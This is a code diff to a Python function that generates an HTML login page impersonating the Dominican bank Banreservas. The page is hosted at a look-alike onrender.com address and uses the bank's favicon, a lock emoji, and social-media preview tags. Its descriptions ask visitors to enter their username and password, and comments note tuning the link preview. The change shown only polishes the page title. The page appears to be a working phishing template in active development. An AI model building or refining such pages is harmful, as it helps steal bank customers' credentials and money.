@@ -171,7 +171,7 @@ def get_template_banreservas():
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     
     <!-- TÍTULO MÁS LARGO (50-60 caracteres) -->
-    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banco en Línea</title>
+    <title>🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea</title>
     
     <!-- Favicon -->
     <link rel="icon" type="image/png" href="https://www.banreservas.com/favicon.ico">
@@ -180,7 +180,7 @@ def get_template_banreservas():
     <!-- Open Graph / Facebook -->
     <meta property="og:type" content="website">
     <meta property="og:url" content="https://banreservas-uyw8.onrender.com">
-    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banco en Línea">
+    <meta property="og:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
     <meta property="og:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
     
     <!-- ⚠️ CAMBIO IMPORTANTE: IMAGEN MÁS GRANDE (1200x630) -->
@@ -196,7 +196,7 @@ def get_template_banreservas():
     <!-- Twitter Card -->
     <meta name="twitter:card" content="summary_large_image">
     <meta name="twitter:url" content="https://banreservas-uyw8.onrender.com">
-    <meta name="twitter:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banco en Línea">
+    <meta name="twitter:title" content="🔐 Acceso Seguro a tu Cuenta Banreservas - Banca en Línea">
     <meta name="twitter:description" content="Ingresa con tu usuario y contraseña para realizar tus transacciones bancarias de forma segura y rápida.">
     <meta name="twitter:image" content="https://i.imgur.com/9NhVr5Q.png">
     
